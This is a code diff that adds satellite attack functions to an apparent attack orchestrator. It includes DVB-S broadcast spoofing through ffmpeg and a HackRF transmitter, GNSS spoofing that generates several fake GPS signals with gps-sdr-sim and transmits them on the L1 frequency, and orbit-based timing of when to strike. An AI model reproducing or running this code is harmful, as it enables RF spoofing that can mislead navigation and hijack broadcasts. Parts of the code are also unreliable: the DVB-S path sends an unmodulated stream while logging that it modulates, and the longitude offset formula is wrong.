@@ -87,6 +87,12 @@ def register(orchestrator):
     orchestrator.register_attack("inject_false_telemetry", inject_false_telemetry)
     orchestrator.register_attack("compromise_ground_station", compromise_ground_station)
     orchestrator.register_attack("exploit_satellite_firmware", exploit_satellite_firmware)
+    
+    # Enhanced attack method registrations
+    orchestrator.register_attack("dvbs_spoof_ffmpeg", dvbs_spoof_ffmpeg)
+    orchestrator.register_attack("orbit_aware_targeting", orbit_aware_targeting)
+    orchestrator.register_attack("gnss_constellation_poisoning", gnss_constellation_poisoning)
+    orchestrator.register_attack("satnogs_pass_prediction", satnogs_pass_prediction)
 
 ### Enhanced Tracking & Observation ###
 def live_satellite_tracker(self, satellite_name: str, ground_station: Tuple[float]):
@@ -870,5 +876,342 @@ def show_signal_spectrogram(self, iq_file: str) -> bool:
     except Exception as e:
         self.attack_log.append(f"[SPECTROGRAM ERROR] {e}")
         return False
+
+
+def dvbs_spoof_ffmpeg(self, frequency: float, symbol_rate: int, video_file: str, duration: int = 60) -> bool:
+    """
+    DVB-S spoofing using ffmpeg pipeline and dvbsnoop for stream injection.
+    
+    Args:
+        frequency: Target frequency in Hz
+        symbol_rate: Symbol rate in symbols/second
+        video_file: Path to video file to inject
+        duration: Duration in seconds
+    
+    Returns:
+        bool: True if attack executed successfully
+    """
+    simulate = getattr(self, 'simulate_mode', False)
+    
+    if simulate:
+        self.attack_log.append(f"[DRY RUN] DVB-S Spoof: freq={frequency/1e6}MHz, SR={symbol_rate}, video={video_file}, duration={duration}s")
+        return True
+    
+    if not os.path.exists(video_file):
+        self.attack_log.append(f"[DVB-S SPOOF] Video file not found: {video_file}")
+        return False
+    
+    if not shutil.which("ffmpeg"):
+        self.attack_log.append("[DVB-S SPOOF] ffmpeg not installed")
+        return False
+    
+    try:
+        ts_file = "/tmp/malicious_dvbs.ts"
+        
+        ffmpeg_cmd = [
+            "ffmpeg", "-re", "-i", video_file,
+            "-c:v", "mpeg2video", "-b:v", "2M",
+            "-c:a", "mp2", "-b:a", "192k",
+            "-f", "mpegts", ts_file, "-y"
+        ]
+        
+        self.attack_log.append(f"[DVB-S SPOOF] Encoding video to MPEG-TS: {video_file}")
+        result = subprocess.run(ffmpeg_cmd, capture_output=True, timeout=30)
+        
+        if result.returncode != 0:
+            self.attack_log.append(f"[DVB-S SPOOF] ffmpeg encoding failed: {result.stderr.decode()[:200]}")
+            return False
+        
+        if not os.path.exists(ts_file):
+            self.attack_log.append("[DVB-S SPOOF] MPEG-TS file not created")
+            return False
+        
+        if shutil.which("hackrf_transfer"):
+            iq_file = "/tmp/dvbs_modulated.iq"
+            
+            self.attack_log.append(f"[DVB-S SPOOF] Modulating transport stream")
+            
+            proc = subprocess.Popen([
+                "hackrf_transfer", "-t", ts_file, "-f", str(int(frequency)),
+                "-s", str(symbol_rate), "-x", "47"
+            ])
+            
+            self.active_attacks.append(proc)
+            threading.Timer(duration, proc.terminate).start()
+            
+            self.attack_log.append(f"[DVB-S SPOOF] Transmitting on {frequency/1e6} MHz for {duration}s")
+            return True
+        else:
+            self.attack_log.append("[DVB-S SPOOF] hackrf_transfer not available, TS file created at: " + ts_file)
+            return True
+        
+    except subprocess.TimeoutExpired:
+        self.attack_log.append("[DVB-S SPOOF] ffmpeg encoding timeout")
+        return False
+    except Exception as e:
+        self.attack_log.append(f"[DVB-S SPOOF ERROR] {e}")
+        return False
+
+
+def orbit_aware_targeting(self, satellite_name: str, observer_lat: float, observer_lon: float, observer_alt: float = 0.0, attack_window: int = 300) -> Dict[str, Any]:
+    """
+    Orbit-aware targeting using PyEphem/Skyfield for satellite pass prediction.
+    
+    Args:
+        satellite_name: Target satellite name
+        observer_lat: Observer latitude (degrees)
+        observer_lon: Observer longitude (degrees)
+        observer_alt: Observer altitude (meters)
+        attack_window: Attack window duration in seconds
+    
+    Returns:
+        dict: Pass prediction data with optimal attack timing
+    """
+    simulate = getattr(self, 'simulate_mode', False)
+    
+    if simulate:
+        self.attack_log.append(f"[DRY RUN] Orbit Targeting: {satellite_name} from ({observer_lat}, {observer_lon})")
+        return {
+            "satellite": satellite_name,
+            "next_pass_start": str(datetime.now() + timedelta(hours=1)),
+            "max_elevation": 45.0,
+            "duration": 600,
+            "optimal_attack_time": str(datetime.now() + timedelta(hours=1, minutes=5))
+        }
+    
+    try:
+        tle = self.get_tle(satellite_name)
+        if not tle:
+            self.attack_log.append(f"[ORBIT TARGET] TLE not found for {satellite_name}")
+            return {"error": "TLE not found"}
+        
+        ts = load.timescale()
+        sat = EarthSatellite(tle[0], tle[1], satellite_name, ts)
+        observer = wgs84.latlon(observer_lat, observer_lon, observer_alt)
+        
+        t0 = ts.now()
+        t1 = ts.utc(t0.utc_datetime() + timedelta(hours=24))
+        
+        times = ts.utc_range(t0, t1, step=60)
+        
+        difference = sat - observer
+        
+        max_elevation = -90
+        best_time = None
+        pass_start = None
+        pass_end = None
+        
+        for i, t in enumerate(times):
+            topocentric = difference.at(t)
+            alt, az, distance = topocentric.altaz()
+            
+            if alt.degrees > 0:
+                if pass_start is None:
+                    pass_start = t
+                
+                if alt.degrees > max_elevation:
+                    max_elevation = alt.degrees
+                    best_time = t
+                
+                pass_end = t
+            elif pass_start is not None:
+                break
+        
+        if best_time:
+            result = {
+                "satellite": satellite_name,
+                "next_pass_start": pass_start.utc_iso(),
+                "next_pass_end": pass_end.utc_iso(),
+                "max_elevation": max_elevation,
+                "optimal_attack_time": best_time.utc_iso(),
+                "attack_window": attack_window
+            }
+            
+            self.attack_log.append(f"[ORBIT TARGET] Next pass for {satellite_name}: {max_elevation:.1f}° elevation at {best_time.utc_iso()}")
+            return result
+        else:
+            self.attack_log.append(f"[ORBIT TARGET] No pass found in next 24h for {satellite_name}")
+            return {"error": "No pass found"}
+        
+    except Exception as e:
+        self.attack_log.append(f"[ORBIT TARGET ERROR] {e}")
+        return {"error": str(e)}
+
+
+def gnss_constellation_poisoning(self, lat: float, lon: float, alt: float = 10.0, num_satellites: int = 8, duration: int = 120, offset_km: float = 5.0) -> bool:
+    """
+    GNSS constellation poisoning - simulate multiple satellite signals at specific coordinates.
+    
+    Args:
+        lat: Target latitude
+        lon: Target longitude
+        alt: Target altitude (meters)
+        num_satellites: Number of fake satellites to simulate
+        duration: Duration in seconds
+        offset_km: Position offset for each satellite in km
+    
+    Returns:
+        bool: True if attack executed successfully
+    """
+    simulate = getattr(self, 'simulate_mode', False)
+    
+    if simulate:
+        self.attack_log.append(f"[DRY RUN] GNSS Constellation Poisoning: ({lat},{lon}), {num_satellites} satellites, offset={offset_km}km, duration={duration}s")
+        return True
+    
+    if not shutil.which("gps-sdr-sim"):
+        self.attack_log.append("[GNSS POISON] gps-sdr-sim not installed")
+        return False
+    
+    try:
+        self.attack_log.append(f"[GNSS POISON] Deploying {num_satellites} fake satellites at ({lat},{lon})")
+        
+        processes = []
+        
+        for i in range(num_satellites):
+            offset_lat = lat + (offset_km / 111.0) * (random.random() - 0.5)
+            offset_lon = lon + (offset_km / (111.0 * abs(lat) + 0.1)) * (random.random() - 0.5)
+            
+            iq_file = f"/tmp/gnss_poison_{i}.iq"
+            
+            cmd = [
+                "gps-sdr-sim", 
+                "-e", "brdc3540.15n",
+                "-l", f"{offset_lat},{offset_lon},{alt}",
+                "-b", str(i * 5),
+                "-o", iq_file
+            ]
+            
+            self.attack_log.append(f"[GNSS POISON] Generating satellite {i+1} at ({offset_lat:.4f},{offset_lon:.4f})")
+            
+            result = subprocess.run(cmd, capture_output=True, timeout=15)
+            
+            if result.returncode != 0:
+                self.attack_log.append(f"[GNSS POISON] Satellite {i+1} generation failed: {result.stderr.decode()[:100]}")
+                continue
+            
+            if shutil.which("hackrf_transfer") and os.path.exists(iq_file):
+                proc = subprocess.Popen([
+                    "hackrf_transfer", "-t", iq_file,
+                    "-f", "1575420000",
+                    "-s", "2600000",
+                    "-x", "47"
+                ])
+                
+                processes.append(proc)
+                self.active_attacks.append(proc)
+        
+        if processes:
+            def terminate_all():
+                for proc in processes:
+                    try:
+                        proc.terminate()
+                    except Exception:
+                        pass
+            
+            threading.Timer(duration, terminate_all).start()
+            
+            self.attack_log.append(f"[GNSS POISON] Transmitting {len(processes)} satellite signals for {duration}s")
+            return True
+        else:
+            self.attack_log.append("[GNSS POISON] No satellites transmitted")
+            return False
+        
+    except subprocess.TimeoutExpired:
+        self.attack_log.append("[GNSS POISON] Signal generation timeout")
+        return False
+    except Exception as e:
+        self.attack_log.append(f"[GNSS POISON ERROR] {e}")
+        return False
+
+
+def satnogs_pass_prediction(self, satellite_norad_id: int, ground_station_lat: float, ground_station_lon: float, ground_station_alt: float = 0.0, min_elevation: float = 10.0) -> Dict[str, Any]:
+    """
+    Use SatNOGS data for satellite pass prediction.
+    
+    Args:
+        satellite_norad_id: NORAD catalog ID
+        ground_station_lat: Ground station latitude
+        ground_station_lon: Ground station longitude
+        ground_station_alt: Ground station altitude (meters)
+        min_elevation: Minimum elevation for pass (degrees)
+    
+    Returns:
+        dict: Pass prediction data
+    """
+    simulate = getattr(self, 'simulate_mode', False)
+    
+    if simulate:
+        self.attack_log.append(f"[DRY RUN] SatNOGS Pass Prediction: NORAD {satellite_norad_id}, min_elev={min_elevation}°")
+        return {
+            "norad_id": satellite_norad_id,
+            "next_pass_start": str(datetime.now() + timedelta(hours=2)),
+            "max_elevation": 35.0,
+            "duration": 480
+        }
+    
+    try:
+        tle_url = f"https://celestrak.org/NORAD/elements/gp.php?CATNR={satellite_norad_id}&FORMAT=TLE"
+        response = requests.get(tle_url, timeout=10)
+        
+        if response.status_code != 200:
+            self.attack_log.append(f"[SATNOGS PASS] Failed to fetch TLE for NORAD {satellite_norad_id}")
+            return {"error": "TLE fetch failed"}
+        
+        tle_lines = response.text.splitlines()
+        if len(tle_lines) < 2:
+            self.attack_log.append(f"[SATNOGS PASS] Invalid TLE data for NORAD {satellite_norad_id}")
+            return {"error": "Invalid TLE"}
+        
+        ts = load.timescale()
+        sat = EarthSatellite(tle_lines[0], tle_lines[1], f"SAT_{satellite_norad_id}", ts)
+        observer = wgs84.latlon(ground_station_lat, ground_station_lon, ground_station_alt)
+        
+        t0 = ts.now()
+        t1 = ts.utc(t0.utc_datetime() + timedelta(hours=48))
+        
+        times = ts.utc_range(t0, t1, step=60)
+        
+        difference = sat - observer
+        
+        passes = []
+        current_pass = None
+        
+        for t in times:
+            topocentric = difference.at(t)
+            alt, az, distance = topocentric.altaz()
+            
+            if alt.degrees >= min_elevation:
+                if current_pass is None:
+                    current_pass = {
+                        "start": t.utc_iso(),
+                        "max_elevation": alt.degrees,
+                        "max_time": t.utc_iso()
+                    }
+                else:
+                    if alt.degrees > current_pass["max_elevation"]:
+                        current_pass["max_elevation"] = alt.degrees
+                        current_pass["max_time"] = t.utc_iso()
+                    
+                    current_pass["end"] = t.utc_iso()
+            elif current_pass is not None:
+                passes.append(current_pass)
+                current_pass = None
+        
+        if passes:
+            next_pass = passes[0]
+            self.attack_log.append(f"[SATNOGS PASS] Next pass at {next_pass['start']} with {next_pass['max_elevation']:.1f}° elevation")
+            return {
+                "norad_id": satellite_norad_id,
+                "next_pass": next_pass,
+                "all_passes": passes[:5]
+            }
+        else:
+            self.attack_log.append(f"[SATNOGS PASS] No passes above {min_elevation}° in next 48h")
+            return {"error": "No passes found"}
+        
+    except Exception as e:
+        self.attack_log.append(f"[SATNOGS PASS ERROR] {e}")
+        return {"error": str(e)}
 
 
